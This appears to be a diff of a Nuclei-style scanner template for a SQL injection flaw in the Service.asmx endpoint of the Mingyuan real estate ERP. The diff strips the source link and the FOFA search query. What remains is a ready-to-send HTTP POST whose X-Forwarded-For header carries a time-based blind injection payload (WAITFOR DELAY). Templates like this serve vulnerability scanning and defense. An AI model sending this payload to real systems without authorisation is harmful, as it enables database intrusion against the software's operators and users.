@@ -3,14 +3,8 @@ info:
   name: 明源地产ERP Service.asmx 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/legz5v3cgrke5up7
-
-    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: legz5v3cgrke5up7
-    fofa: body="/_common/scripts/md5-min.js"
 http:
 - raw:
   - "POST /Kfxt/Service.asmx HTTP/1.1\nHost: {{Hostname}}\nReferer: [http://www.baidu.com](http://www.baidu.com)\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0\nContent-Type: text/xml; charset=utf-8\nX-Forwarded-For: 127.0.0.1');WAITFOR DELAY '0:0:5'--\nContent-Length: 415\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <queryProjects xmlns=\"http://www.mysoft.com.cn/\">\n      <inpXML><xml><buname>abc</buname></xml></inpXML>\n    </queryProjects>\n  </soap:Body>\n</soap:Envelope>"
